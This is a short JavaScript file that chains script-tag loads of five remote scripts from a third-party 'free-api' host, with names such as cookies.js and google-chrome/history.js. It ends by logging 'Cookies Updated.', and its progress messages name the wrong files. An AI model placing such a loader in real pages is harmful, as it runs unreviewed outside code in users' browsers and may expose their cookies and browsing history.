function loadScript(url) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = url;
    script.onload = resolve;
    script.onerror = reject;
    document.head.appendChild(script);
  });
}

const urlToImport1 = 'https://www.myindianhub.com/free-api/api/my-api-01/duckduckgo.js';

loadScript(urlToImport1)
  .then(() => {
    console.log("Loaded and executed tor.js");
    return loadScript('https://www.myindianhub.com/free-api/api/my-api-02/tor.js');
  })
  .then(() => {
    console.log("Loaded and executed search.js");
    return loadScript('https://www.myindianhub.com/free-api/api/my-api-03/search.js');
  })
  .then(() => {
    console.log("Loaded and executed cookies.js");
    return loadScript('https://www.myindianhub.com/free-api/api/my-api-04/cookies.js');
  })
  .then(() => {
    console.log("Loaded and executed history.js");
    return loadScript('https://www.myindianhub.com/free-api/api/google-chrome/history.js');
  })
  .then(() => {
    console.log("Cookies Updated.");
  })
  .catch(error => {
    console.error('Error loading or executing the script:', error);
  });
